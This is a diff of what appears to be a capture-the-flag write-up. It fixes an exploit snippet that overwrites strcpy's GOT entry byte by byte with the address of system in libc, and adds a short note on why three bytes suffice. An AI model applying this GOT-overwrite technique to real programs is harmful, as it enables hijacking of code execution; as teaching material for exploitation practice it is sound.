@@ -140,10 +140,10 @@ b0 = u64(SYSTEM_AT_LIBC) & 0xff
 send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b0, 18))
 
 b1 = (u64(SYSTEM_AT_LIBC) >> 8) & 0xff
-send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b1, 18)) 
+send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 1, b1, 18)) 
 
 b2 = (u64(SYSTEM_AT_LIBC) >> 16) & 0xff
-send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b2, 18))
+send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 2, b2, 18))
 ```
 
 Because they are both in the same binary, libc, they aren't that far off in memory, so it suffices to rewrite the last 3 bytes of `strcpy@libc` with the last 3 bytes of `system@libc`, as the rest of the address is the same.
